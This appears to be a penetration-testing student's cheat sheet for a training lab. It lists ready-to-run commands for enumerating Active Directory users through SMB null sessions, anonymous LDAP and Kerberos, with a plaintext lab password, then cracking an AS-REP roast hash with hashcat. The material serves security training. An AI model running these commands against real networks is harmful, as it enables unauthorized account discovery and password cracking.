

# **SMB NULL Session to Pull User List**

##### **Using enum4linux**

```bash
# Pulls user list via null session, extracts just usernames
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
##### **Using rpcclient**
```bash
# Opens null session RPC connection
rpcclient -U "" -N 172.16.5.5

# Lists all domain users (run inside rpcclient)
rpcclient $> enumdomusers
```
##### **Using CrackMapExec --users Flag**
```bash
# Lists users without credentials
crackmapexec smb 172.16.5.5 --users
```


# **Gathering Users with LDAP Anonymous**
##### **Using ldapsearch**
```bash
# Searches for all user objects anonymously
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
##### **Using windapsearch**
```bash
# Python tool for anonymous LDAP user enumeration
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


# **Enumerating Users with Kerbrute**

We will use the word-list [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) to enumerate users
```bash
# Enumerates valid users by checking Kerberos pre-authentication
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

## **Credentialed Enumeration to Build our User List**

##### **Using CrackMapExec with Valid Credentials**
```bash
# Lists all domain users using valid credentials
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

# Cracking the kerburtue hash

- Paste the hash
```bash
# AS-REP Roast hash format (target@domain:hash)
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:fb90f01... (rest of the hash)
```
- Crack it
```bash
# Cracks AS-REP Roast hash (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt 

# Forces crack even with driver warnings
# `--force` → only if needed (e.g., with GPU driver error
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
```